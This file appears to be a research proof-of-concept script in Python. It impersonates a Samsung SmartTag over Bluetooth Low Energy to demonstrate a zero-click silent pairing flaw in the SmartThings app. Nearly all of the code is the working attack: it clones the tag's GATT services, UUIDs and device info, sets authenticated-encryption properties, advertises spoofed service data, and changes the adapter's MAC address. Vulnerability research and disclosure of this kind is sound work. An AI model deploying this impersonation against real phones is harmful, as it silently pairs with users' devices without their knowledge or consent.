# -----------------------------------------------------------
# This script demonstrates a zero-click silent pairing vulnerability that can be triggered
# when SmartThings app tries to connect to an impersonated SmartTag, by setting the properties of certain
# characteristics to "encrypt-authenticated-read"/"encrypt-authenticated-write"
# (c) 2022 Tingfeng Yu
# -----------------------------------------------------------

import logging
import subprocess
import sys
import time
import warnings
from subprocess import call

import dbus
import dbus.exceptions
import dbus.mainloop.glib
from bluepy.btle import DefaultDelegate, Scanner
from gatt_advert import Advertisement
from gatt_agent import Agent
from gatt_server import (
    Characteristic,
    Descriptor,
    Service,
    register_app_cb,
    register_app_error_cb,
)
from gi.repository import GLib

BLUEZ_SERVICE_NAME = "org.bluez"
DBUS_OM_IFACE = "org.freedesktop.DBus.ObjectManager"
LE_ADVERTISING_MANAGER_IFACE = "org.bluez.LEAdvertisingManager1"
GATT_MANAGER_IFACE = "org.bluez.GattManager1"
GATT_CHRC_IFACE = "org.bluez.GattCharacteristic1"
DBUS_PROP_IFACE = "org.freedesktop.DBus.Properties"
AGENT_IFACE = "org.bluez.Agent1"
AGNT_MNGR_IFACE = "org.bluez.AgentManager1"
AGENT_PATH = "/my/app/agent"
AGNT_MNGR_PATH = "/org/bluez"
CAPABILITY = "NoInputNoOutput"
# replace with the unique UUID of your app
LOCAL_NAME = "Silent Pairing Demo"

onboarding_svc_uuid = "0000fd59-0000-1000-8000-00805f9b34fb"
time_svc_uuid = "0000fd5a-0000-1000-8000-00805f9b34fb"
auth_svc_uuid = "eedd5e73-6aa8-4673-8219-398a489da87c"
mac_uuid = "08a11e38-1c6d-4929-9c32-4f32a64985ce"
hash_uuid = "6ac16db1-f442-4bf4-b804-04c32356465d"
cipher_uuid = "50f98bfd-158c-4efa-add4-0a70c2f5df5d"
nonce_uuid = "a12be31c-5b38-4773-9b9d-3d5735233a7c"
enonce_uuid = "4ebe81f6-b952-465e-9ece-5ca39d4e8955"
dfu_svc_uuid = "0000fe59-0000-1000-8000-00805f9b34fb"
dfu_char_uuid = "8ec90003-f315-4f60-9fb8-838830daea50"
owner_sound_uuid = "dee30001-182d-5496-b1ad-14f216324184"

mainloop = None

payloadstr = "Testing silent pairing"

payload = payloadstr.encode("ascii")


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            logging.info("Discovered device " + dev.addr)
        elif isNewData:
            logging.info("Received new data from " + dev.addr)


def register_ad_cb():
    print("Advertisement registered")


def register_ad_error_cb(error):
    global mainloop
    print("Failed to register advertisement: " + str(error))
    mainloop.quit()


class Application(dbus.service.Object):
    def __init__(self, bus):
        self.path = "/"
        self.services = []
        dbus.service.Object.__init__(self, bus, self.path)

    def get_path(self):
        return dbus.ObjectPath(self.path)

    def add_service(self, service):
        self.services.append(service)

    @dbus.service.method(DBUS_OM_IFACE, out_signature="a{oa{sa{sv}}}")
    def GetManagedObjects(self):
        response = {}
        for service in self.services:
            response[service.get_path()] = service.get_properties()
            chrcs = service.get_characteristics()
            for chrc in chrcs:
                response[chrc.get_path()] = chrc.get_properties()
        return response


class Properties:
    def __init__(self, properties):
        self.read = properties[0]
        self.write = properties[1]
        self.indicate = properties[2]
        self.notify = properties[3]

    def get(self):
        output = []
        if self.read:
            output.append("encrypt-authenticated-read")
        if self.write:
            output.append("encrypt-authenticated-write")
        if self.indicate:
            output.append("indicate")
        if self.notify:
            output.append("notify")
        return output


class TagCharacteristic(Characteristic):
    def __init__(self, bus, index, service, char_uuid, properties, value="default"):
        Characteristic.__init__(
            self, bus, index, char_uuid, Properties(properties).get(), service
        )
        self.value = value.encode("ascii")

    def ReadValue(self, options):
        print("Tag Characteristic {} is read: {}".format(char_uuid, repr(self.value)))
        return self.value

    def notify_sth(self):
        if not self.notifying:
            return
        self.PropertiesChanged(GATT_CHRC_IFACE, {"Value": [dbus.Byte(100)]}, [])

    def StartNotify(self):
        if self.notifying:
            print("Already notifying, nothing to do")
            return
        self.notifying = True
        self.notify_sth()

    def StopNotify(self):
        if not self.notifying:
            print("Not notifying, nothing to do")
            return
        self.notifying = False


class Tagfd5aService(Service):
    def __init__(self, bus, index):
        Service.__init__(self, bus, index, time_svc_uuid, True)
        self.add_characteristic(
            TagCharacteristic(bus, 0, self, owner_sound_uuid, [1, 1, 1, 0])
        )
        # self.add_characteristic(PhonePlaySoundCharacteristic(bus, 1, self))
        self.add_characteristic(
            TagCharacteristic(
                bus, 1, self, "dee30002-182d-5496-b1ad-14f216324184", [1, 1, 0, 1]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 2, self, "dee30003-182d-5496-b1ad-14f216324184", [0, 1, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 3, self, "dee30004-182d-5496-b1ad-14f216324184", [1, 0, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 4, self, "dee30005-182d-5496-b1ad-14f216324184", [0, 1, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 5, self, "dee30006-182d-5496-b1ad-14f216324184", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 6, self, "dee30007-182d-5496-b1ad-14f216324184", [1, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 7, self, "dee3000a-182d-5496-b1ad-14f216324184", [1, 1, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 8, self, "dee3000b-182d-5496-b1ad-14f216324184", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 9, self, "dee3000c-182d-5496-b1ad-14f216324184", [1, 1, 1, 0]
            )
        )  # write no response
        self.add_characteristic(
            TagCharacteristic(
                bus, 10, self, "dee3000d-182d-5496-b1ad-14f216324184", [1, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 11, self, "dee3000e-182d-5496-b1ad-14f216324184", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 12, self, "dee3000f-182d-5496-b1ad-14f216324184", [0, 1, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 13, self, "dee30020-182d-5496-b1ad-14f216324184", [1, 1, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 14, self, "dee30030-182d-5496-b1ad-14f216324184", [0, 1, 0, 0]
            )
        )


class Tagfd59Service(Service):
    def __init__(self, bus, index):
        Service.__init__(self, bus, index, "0000fd59-0000-1000-8000-00805f9b34fb", True)
        self.add_characteristic(
            TagCharacteristic(
                bus, 0, self, "04052818-d201-43eb-9d81-e936dc86ee06", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 1, self, "77b08bec-5890-49d1-b021-811741b417e6", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 2, self, "08a11e38-1c6d-4929-9c32-4f32a64985ce", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 3, self, "5b5f7a4c-257e-4841-92d5-0042658122b6", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 4, self, "12761292-241c-490c-8424-6f7cc8a8a027", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 5, self, "6ea31174-87b8-4ff6-98fa-796d87323792", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 6, self, "d19ddd83-bbe1-4144-bb18-f3ceb57c480a", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 7, self, "7534c394-1f40-4d12-afd7-dc2a75bd6a44", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 8, self, "bcc8cce6-8af6-48dc-a0ae-547f7c095229", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 9, self, "b03bd357-034a-4c57-ae56-575d974fc9de", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 10, self, "b57a3fe1-cf5e-4644-81ab-134d9f8ccaca", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 11, self, "89b0dfcb-0d9e-42b5-bc98-9a786fdc7d35", [0, 0, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 12, self, "661ef3f1-3ac1-483a-9fcb-8014c82bbfae", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 13, self, "be3a2589-1dfa-4a0a-9429-93899936cbed", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 14, self, "6ac16db1-f442-4bf4-b804-04c32356465d", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 15, self, "b5754629-6821-44c6-a118-492feecf6bb2", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 16, self, "bebfaa51-dcb8-44de-a4b8-fc8c9c7ef46d", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 17, self, "30c48d2a-6ccb-4240-9f97-7f97a3f1c030", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 18, self, "f299f805-17b3-43c1-ac12-fbcc59ee2f0d", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 19, self, "d0e8d14e-3d0b-4bda-9dad-4c2790f36210", [0, 1, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 20, self, "5352fee4-f3bc-462c-ba7c-279873bcdd71", [1, 0, 0, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 21, self, "17bc2035-69ab-4a4f-b41b-7deb18ce6413", [0, 1, 1, 0]
            )
        )
        self.add_characteristic(
            TagCharacteristic(
                bus, 22, self, "abd6e6ba-3843-4786-b9b2-b69548eed881", [0, 1, 0, 0]
            )
        )


class TagDFUService(Service):
    def __init__(self, bus, index):
        Service.__init__(self, bus, index, dfu_svc_uuid, True)
        self.add_characteristic(
            TagCharacteristic(bus, 0, self, dfu_char_uuid, [1, 1, 0, 0])
        )  # Buttonless DFU


class TagAuthService(Service):
    def __init__(self, bus, index):
        Service.__init__(self, bus, index, auth_svc_uuid, True)
        self.add_characteristic(
            TagCharacteristic(bus, 0, self, nonce_uuid, [1, 1, 1, 0])
        )  # nonce (r w i)
        self.add_characteristic(
            TagCharacteristic(bus, 1, self, enonce_uuid, [0, 1, 1, 0])
        )  # enc nonce (w i)
        self.add_characteristic(
            TagCharacteristic(
                bus, 2, self, "50f98bfd-158c-4efa-add4-0a70c2f5df5d", [1, 1, 0, 0]
            )
        )  # (r w)


class DeviceInfoService(Service):
    def __init__(self, bus, index):
        Service.__init__(self, bus, index, "180a", True)
        self.add_characteristic(
            TagCharacteristic(bus, 0, self, "2a29", [1, 0, 0, 0], "SOLUM")
        )  # Manufacturer name string
        self.add_characteristic(
            TagCharacteristic(bus, 1, self, "2a26", [1, 0, 0, 0], "1.0126")
        )  # FWRevisionString
        self.add_characteristic(
            TagCharacteristic(bus, 2, self, "2a28", [1, 0, 0, 0], "2")
        )  # SWRevisionString


class TagApplication(Application):
    def __init__(self, bus):
        Application.__init__(self, bus)
        self.add_service(TagAuthService(bus, 0))
        self.add_service(Tagfd5aService(bus, 1))
        self.add_service(TagDFUService(bus, 2))
        self.add_service(DeviceInfoService(bus, 3))
        self.add_service(Tagfd59Service(bus, 4))


class TagAdvertisement(Advertisement):
    def __init__(self, bus, index, data):
        Advertisement.__init__(self, bus, index, "peripheral")
        self.add_service_uuid(time_svc_uuid)
        data = bytes.fromhex(data)
        self.add_service_data(time_svc_uuid, data)
        self.add_local_name(LOCAL_NAME)
        self.include_tx_power = True


class newTagAdvertisement(Advertisement):
    def __init__(self, bus, index, data):
        Advertisement.__init__(self, bus, index, "peripheral")
        self.add_service_uuid(onboarding_svc_uuid)
        data = bytes.fromhex(data)
        self.add_service_data(onboarding_svc_uuid, data)
        self.add_local_name(LOCAL_NAME)
        self.include_tx_power = True


class TagAgent(Agent):
    def __init__(self, bus):
        Agent.__init__(self, bus)
        self.add_service(TagAuthService(bus, 0))
        self.add_service(Tagfd5aService(bus, 1))
        self.add_service(TagDFUService(bus, 2))


def find_adapter(bus):
    remote_om = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, "/"), DBUS_OM_IFACE)
    objects = remote_om.GetManagedObjects()
    for o, props in objects.items():
        if LE_ADVERTISING_MANAGER_IFACE in props and GATT_MANAGER_IFACE in props:
            return o
        print("Skip adapter:", o)
    return None


def endloop():
    mainloop.quit()
    return False


def change_mac_address(addr):
    subprocess.run(["./bdaddr", "-i", "hci0", addr], capture_output=True)
    subprocess.run(["hciconfig", "hci0", "down"], capture_output=True)
    subprocess.run(["hciconfig", "hci0", "up"], capture_output=True)
    return addr


def main():
    global mainloop
    isRegistered = True  # False
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()
    adapter = find_adapter(bus)
    if not adapter:
        print("BLE adapter not found")
        return
    adapter_props = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, adapter), "org.freedesktop.DBus.Properties"
    )
    adapter_props.Set("org.bluez.Adapter1", "Powered", dbus.Boolean(1))
    ad_manager = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, adapter), LE_ADVERTISING_MANAGER_IFACE
    )
    service_manager = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, adapter), GATT_MANAGER_IFACE
    )
    app = TagApplication(bus)
    agent = Agent(bus, AGENT_PATH)
    agnt_mngr = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, AGNT_MNGR_PATH), AGNT_MNGR_IFACE
    )

    data = "13043701d158cd18c4ad6722c30000008b0363ea"
    adv = TagAdvertisement(bus, 0, data)

    mainloop = GLib.MainLoop()
    service_manager.RegisterApplication(
        app.get_path(),
        {},
        reply_handler=register_app_cb,
        error_handler=register_app_error_cb,
    )
    ad_manager.RegisterAdvertisement(
        adv.get_path(),
        {},
        reply_handler=register_ad_cb,
        error_handler=register_ad_error_cb,
    )
    agnt_mngr.RegisterAgent(AGENT_PATH, CAPABILITY)
    agnt_mngr.RequestDefaultAgent(AGENT_PATH)
    try:
        mainloop.run()
    except KeyboardInterrupt:
        adv.Release()
        agnt_mngr.UnregisterAgent(AGENT_PATH)
        mainloop.quit()


if __name__ == "__main__":
    main()
